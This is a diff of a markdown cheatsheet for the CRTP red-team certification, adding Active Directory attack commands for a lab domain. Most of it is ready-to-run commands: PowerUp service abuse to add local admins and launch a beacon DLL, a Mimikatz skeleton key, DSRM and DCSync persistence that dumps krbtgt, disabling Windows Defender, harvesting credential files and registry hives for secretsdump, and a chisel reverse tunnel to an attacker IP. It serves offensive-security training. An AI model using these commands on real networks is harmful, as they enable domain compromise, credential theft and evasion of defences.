@@ -1,12 +1,13 @@
 # Cheatsheet for Certified Red Team Professional (CRTP) 
 
 - [Cheatsheet for Certified Red Team Professional (CRTP)](#cheatsheet-for-certified-red-team-professional-crtp)
+- [General](#general)
   - [PowerShell AMSI Bypass](#powershell-amsi-bypass)
   - [PowerShell One-liners](#powershell-one-liners)
   - [WMI Commands](#wmi-commands)
 - [Enumeratiom](#enumeratiom)
   - [PowerView](#powerview)
-    - [General](#general)
+    - [General](#general-1)
     - [ACL](#acl)
     - [Forest and trust](#forest-and-trust)
     - [OU](#ou)
@@ -16,8 +17,14 @@
   - [PowerView](#powerview-1)
   - [Derivative local admin loop](#derivative-local-admin-loop)
   - [Bloodhound](#bloodhound)
+    - [Installing neo4j](#installing-neo4j)
   - [Kerberoasting](#kerberoasting)
+    - [Automatic](#automatic)
+    - [Manual](#manual)
+    - [Make user kerberoastable by setting SPN](#make-user-kerberoastable-by-setting-spn)
   - [Token Manipulation](#token-manipulation)
+    - [Invoke-TokenManipulation](#invoke-tokenmanipulation)
+    - [Mimikatz](#mimikatz)
   - [Command execution with schtask](#command-execution-with-schtask)
   - [Command execution with WMI](#command-execution-with-wmi)
   - [Command executing with PowerShell Remoting](#command-executing-with-powershell-remoting)
@@ -482,23 +489,191 @@ impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F17
 
 
 ## Command executing with PowerShell Remoting
+(requires 'HTTP' SPN (and 'HOST' and/or 'WSMAN'?))
+This one is a bit tricky. I found it to work the least of the listed methods, a combination of the above SPNs may or may not work - also PowerShell may require the exact FQDN to be provided.
 
+Create credential as another user (if needed):
+```
+$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('CORP\pgibbons', $SecPassword)
+```
+Run a command remotely (can be used one-to-many!):
+```
+Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock {whoami; hostname}
+```
+Launch a session as another user (prompt for password):
+```
+Enter-PSSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator
+```
+Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt:
+```
+$sess = New-PsSession -Credential $Cred
+Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
+Enter-PsSession -Session $sess
+```
+PRO TIP: You can copy files into a PowerShell remoting session as follows:
+```
+Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination "C:\Users\dbprodadmin\documents\"
+```
 
 # Privilege Escalation
-
 ## PowerUp
+PowerUp
+Enumerate all services with Unquoted Path:
+```
+Get-ServiceUnquoted
+```
+Enumerate services where the urrent user can make changes to service binary (look for CanRestart?):
+```
+Get-ModifiableServiceFile -Verbose
+```
+Enumerate services with weak permissions:
+```                                          
+Get-ModifiableService
+```
+Check for vulnerable programs and configs:
+```
+Invoke-AllChecks
+```                                                                    
 
+Exploit vulnerable service permissions (does not require touching disk):
+```
+Add user to local admins group:
+Invoke-ServiceAbuse -Name '[servicename]' -UserName 'dcorp\student124'    
+
+Add user:      
+Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net localgroup Administrators domain\user /add"		
+```
+Exploit vulnerable service permissions to trigger stable beacon:
+```
+Write-ServiceBinary -Name 'AbyssWebServer' -Command 'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update' -Path 'C:\WebServer\Abyss'
+net stop AbyssWebServer
+net start AbyssWebServer
+```
 
 # Domain Persistence
-
 ## Mimikatz skeleton key attack
-## Domain Controller DSRM attack
-## DCSync
+Run from DC. Enables password "mimikatz" for all users (noisy).
+```
+privilege::debug
+misc::skeleton
+```
+Or:
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+```
+Use Enter-PSSession to access any many as any user untill the DC is restarted.
+```
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
+```
 
+## Domain Controller DSRM attack
+The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first:
+```
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+Now we can login remotely using the local admin hash dumped on the DC before (with lsadump::sam, see 'Dumping secrets with Mimikatz'). Use e.g. 'overpass the hash' to get a session (see 'Mimikatz' above).
+
+## DCSync
+Check replication rights:
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+```
+Grant specific user DCSync rights with PowerView:
+```
+Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student124 -Rights DCSync -Verbose
+```
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
 
 # Post-Exploitation
-
 ## Disable defender
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+```
+
 ## Juicy files
+There are lots of files that may contain interesting information. Tools like WinPEAS or collections like PowerSploit may help in identifying juicy files (for privesc or post-exploitation).
+Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.
+
+In addition, don't forget to enumerate any local databases with sqlcmd or Invoke-SqlCmd!
+
+All user folders
+Limit this command if there are too many files ;)
+```
+tree /f /a C:\Users
+```
+Web.config
+```
+C:\inetpub\www\*\web.config
+```
+Unattend files
+```
+C:\Windows\Panther\Unattend.xml
+```
+RDP config files
+```
+C:\ProgramData\Configs\
+```
+Powershell scripts/config files
+```
+C:\Program Files\Windows PowerShell\
+```
+PuTTy config
+```
+C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty
+```
+FileZilla creds
+```
+C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml
+```
+Jenkins creds (also check out the Windows vault, see above)
+```
+C:\Program Files\Jenkins\credentials.xml
+```
+WLAN profiles
+```
+C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml
+```
+TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
+```
+Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
+```
+
 ## Dumping secrets without Mimikatz
+On target:
+```
+reg.exe save hklm\sam c:\users\public\downloads\sam.save
+reg.exe save hklm\system c:\users\public\downloads\system.save
+reg.exe save hklm\security c:\users\public\downloads\security.save
+```
+
+On attacker Linux machine:
+```
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out
+```
 ## Chisel proxying
+Just an example on how to set up a Socks proxy to chisel over a compromised host.
+
+On attacker machine (Linux or Windows):
+```
+./chisel server -p 8888 --reverse
+```
+
+On target:
+```
+.\chisel_windows_386.exe client 10.10.16.7:8888 R:8001:127.0.0.1:9001
+```
+
+Now we are listening on localhost:8001 on our attacking machine to forward that traffic to target:9001.
+Then, open the Socks server. On target:
+```
+.\chisel_windows_386.exe server -p 9001 --socks5
+```
+
+On attacking machine:
+```
+./chisel client localhost:8001 socks
+```
